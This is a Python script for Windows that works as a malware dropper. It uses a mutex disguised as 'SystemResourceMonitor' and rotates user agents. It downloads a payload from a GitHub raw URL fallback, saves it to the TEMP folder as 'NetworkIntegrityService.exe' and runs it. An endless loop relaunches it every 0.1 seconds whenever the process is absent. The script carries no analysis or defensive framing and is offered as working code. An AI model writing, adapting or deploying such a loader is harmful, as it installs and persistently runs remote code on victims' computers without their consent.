import os
import time
import urllib.request
import random
import gzip
import subprocess
from io import BytesIO
import win32api
import win32event
import sys

def create_mutex(mutex_name):
    try:
        mutex = win32event.CreateMutex(None, 0, mutex_name)
        if win32api.GetLastError() == 183:  
            print("Mutex already exists. Exiting.")
            return False
        return True
    except Exception as e:
        print(f"Failed to create mutex: {e}")
        return False

if os.name == "nt":
    mutex_name = "SystemResourceMonitor"
    if not create_mutex(mutex_name):
        sys.exit(0)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def fetch_url_with_random_user_agent(raw_url, fallback_url):
    user_agent = random.choice(user_agents)
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    def fetch_url(url):
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req) as response:
                if 'gzip' in response.headers.get('Content-Encoding', ''):
                    buf = BytesIO(response.read())
                    f = gzip.GzipFile(fileobj=buf)
                    return f.read().decode('utf-8')
                else:
                    return response.read().decode('utf-8')
        except urllib.error.HTTPError as e:
            print(f"HTTP error while fetching {url}: {e}")
            return None
        except Exception as e:
            print(f"Error while fetching {url}: {e}")
            return None

    raw_code = fetch_url(raw_url)
    
    if not raw_code:
        print(f"Fetching fallback URL: {fallback_url}")
        raw_code = fetch_url(fallback_url)
    
    return raw_code

def write_and_execute(raw_code):
    try:
        if raw_code:
            temp_dir = os.getenv('TEMP')
            test_file_path = os.path.join(temp_dir, 'NetworkIntegrityService.exe')

            with open(test_file_path, 'wb') as f:
                f.write(raw_code)
            
            print(f"Executing {test_file_path}")
            subprocess.Popen([test_file_path], shell=True)
        else:
            print("No raw code to write and execute.")
    except Exception as e:
        print(f"Error in write_and_execute: {e}")

raw_url = 'https://test'
fallback_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/fetch'

try:
    raw_code = fetch_url_with_random_user_agent(raw_url, fallback_url)
    print(f"Raw code fetched: {raw_code[:100]}...")  
except Exception as e:
    print(f"Error fetching raw code: {e}")

def check_running():
    try:
        print("Checking if processes are running.")
        for process_name in ["NetworkIntegrityService.exe", "SecurityHealthCheck.exe"]:
            output = subprocess.check_output(
                ["tasklist", "/FI", f"IMAGENAME eq {process_name}"],
                stderr=subprocess.PIPE,
                shell=True  
            )
            print(f"Tasklist output for {process_name}: {output.decode()}")
            if bytes(process_name, 'utf-8') not in output:
                print(f"{process_name} is not running. Attempting to execute raw code.")
                write_and_execute(raw_code.encode('utf-8') if isinstance(raw_code, str) else raw_code)
    except subprocess.CalledProcessError as e:
        print(f"Error running tasklist: {e}")
    except Exception as e:
        print(f"An error occurred in check_running: {e}")

while True:
    check_running()
    print("Checked Running")
    time.sleep(0.1)
